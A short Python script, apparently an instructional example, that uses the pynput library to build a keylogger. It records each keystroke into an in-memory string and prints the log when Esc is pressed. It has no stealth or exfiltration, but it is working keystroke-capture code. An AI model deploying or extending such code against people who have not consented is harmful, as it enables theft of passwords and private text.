from pynput import keyboard

# Log creation
class KeyLogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            # Turn the key into a string
            current_key = str(key.char)
        # Behaviour when the key is not a letter/number
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print(self.log)
                return False
            else:
                current_key = str(key)
        # Append the key to the log
        self.log += current_key

    # Collect events
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Creation of an instance
logger = KeyLogger()
# Execution
logger.start()
